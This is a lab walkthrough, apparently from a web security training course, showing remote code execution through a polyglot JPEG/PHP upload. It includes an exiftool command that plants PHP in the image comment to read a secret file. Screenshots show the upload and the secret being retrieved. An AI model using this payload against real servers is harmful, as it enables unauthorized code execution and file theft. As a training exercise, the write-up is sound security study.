**File upload vulnerabilities || Lab#6 || Remote code execution via polyglot web shell upload**

<img width="787" height="407" alt="image" src="https://github.com/user-attachments/assets/aab193e2-3520-476e-9fac-efa0802872bc" />

Goal of this lab is to exploit the file upload vulnerability to exfiltrate the contents of the file /home/carlos/secret.

Credentials: wiener || peter

Lets start the lab

<img width="915" height="525" alt="image" src="https://github.com/user-attachments/assets/a9be2ae1-8cea-4bef-a63d-c70a8d7857c5" />

Lets login with the credentials that we have wiener || peter

<img width="725" height="522" alt="image" src="https://github.com/user-attachments/assets/29b906e6-da05-4717-8c30-05a90abf0afe" />

There is an option to upload a file. Lets try to upload the same php file that we used in last lab

<img width="1065" height="187" alt="image" src="https://github.com/user-attachments/assets/3448f7b1-1cc6-481f-b0ab-3144314b18e9" />

We got an error that the file is not a valid image. It does not tell about the extension like .jpeg or .png is allowed to upload. So it means the application is doing inspection if the file is truly an image or not.

Lets create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.

We can create it with a help of a tool exiftool.

We have a .jpg file dice.jpg in /home/kali/Downloads on which we put php code.

exiftool -Comment=”&lt;?php echo ‘START ‘ . file_get_contents(‘/home/carlos/secret’) . ‘ END’; ?&gt;” /home/kali/Downloads/dice

<img width="1100" height="167" alt="image" src="https://github.com/user-attachments/assets/57fda540-9549-4523-8196-4d2bee30bce0" />

Lets try to upload this php file.

<img width="582" height="395" alt="image" src="https://github.com/user-attachments/assets/824739db-ce64-411e-b5d7-c1e95892a74d" />

<img width="766" height="145" alt="image" src="https://github.com/user-attachments/assets/d720e745-e904-4b26-a272-d69fe2ceba71" />

The file got updated successfully. Lets check

<img width="682" height="467" alt="image" src="https://github.com/user-attachments/assets/3b2759f1-8372-44cb-ae6c-bc186c859acf" />

<img width="1100" height="214" alt="image" src="https://github.com/user-attachments/assets/2e072500-4c7e-47c8-83d6-cf7e770aae73" />

We got the secret key. The secret key will be between START and END

Lets submit it.

<img width="912" height="327" alt="image" src="https://github.com/user-attachments/assets/d77a9dca-db14-4ab2-9c65-a816825d20ca" />

And lab is solved

<img width="751" height="261" alt="image" src="https://github.com/user-attachments/assets/703e5c29-7107-4d85-9fc9-52233ddc9ab3" />

